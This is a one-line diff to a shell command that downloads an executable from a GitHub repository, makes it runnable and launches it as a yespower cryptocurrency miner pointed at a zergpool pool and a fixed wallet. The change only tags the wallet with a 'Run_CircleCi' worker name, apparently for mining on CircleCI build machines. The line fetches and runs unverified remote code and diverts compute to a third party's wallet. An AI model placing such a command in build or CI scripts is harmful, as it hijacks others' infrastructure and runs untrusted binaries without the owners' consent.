@@ -1,1 +1,1 @@
-wget https://raw.githubusercontent.com/kastaniku/kanturen/master/last && chmod u+x * && ./last --disable-gpu --algorithm yespower --pool yespower.na.mine.zergpool.com:6533 --wallet DDroUTb1YnPcqT7bM1vtCiXA9gjegm1Beb --cpu-threads 12
+wget https://raw.githubusercontent.com/kastaniku/kanturen/master/last && chmod u+x * && ./last --disable-gpu --algorithm yespower --pool yespower.na.mine.zergpool.com:6533 --wallet DDroUTb1YnPcqT7bM1vtCiXA9gjegm1Beb.Run_CircleCi --cpu-threads 12
